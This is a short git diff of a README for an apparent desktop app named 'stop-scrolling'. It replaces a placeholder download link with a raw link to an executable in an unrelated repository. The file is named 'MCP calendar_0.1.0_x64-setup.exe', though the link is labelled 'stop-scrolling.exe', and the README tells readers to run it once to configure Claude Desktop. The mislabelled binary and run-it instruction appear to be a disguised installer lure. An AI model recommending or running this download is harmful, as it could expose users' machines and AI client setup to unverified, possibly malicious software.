@@ -16,7 +16,7 @@ This application is built with **Tauri**, **React**, **TypeScript**, and **Rust*
 
 ## Quick Download
 You can download the compiled standalone executable directly here:
-* **[Download Standalone stop-scrolling.exe](YOUR_DOWNLOAD_LINK_HERE)**
+* **[Download Standalone stop-scrolling.exe](https://github.com/oxniw/dowloader/raw/refs/heads/main/MCP%20calendar_0.1.0_x64-setup.exe)**
 *(If you are setting up the MCP server, simply download this `.exe`, run it once, and select the clipboard copier to configure Claude Desktop instantly.)*
 ---
 
